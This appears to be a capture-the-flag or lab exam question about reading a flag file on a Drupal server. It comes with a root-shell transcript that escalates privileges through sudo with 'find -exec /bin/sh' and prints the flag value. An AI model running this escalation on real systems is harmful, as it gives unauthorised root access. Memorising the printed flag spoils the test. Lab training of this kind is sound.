
Q: 32/35

The server hosting Drupal contains the file /home/auditor/flag.txt. What is the value of the flag?

I understand that I only have one attempt at this answer. After clicking _Submit answer_, I will not be able to make edits. Your answer will be graded based on the state of the lab environment at the time it is submitted.

Submit answer

Case-sensitive answer. Please enter text as displayed.








```bash
auditor@ip-192-168-100-52:~$ sudo /usr/bin/find . -exec /bin/sh \; -quit
# whoami
root
# ls /home
auditor  dbadmin  ubuntu
# cat /home/auditor/flag.txt
b9c3a9212f6d4452a9c5daef7795aabe
# 
```bash